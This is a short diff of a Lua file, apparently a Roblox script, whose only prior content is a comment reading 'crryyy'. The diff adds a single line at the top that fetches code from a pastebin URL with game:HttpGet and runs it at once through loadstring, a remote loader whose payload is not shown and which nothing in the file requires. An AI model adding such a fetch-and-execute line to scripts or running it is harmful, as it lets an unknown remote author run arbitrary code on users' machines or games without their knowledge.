@@ -1,4 +1,7 @@
 
+loadstring(game:HttpGet('https://pastebin.com/raw/A7eYqt8k'))()
+
+
 --[[
             crryyy
 --]]
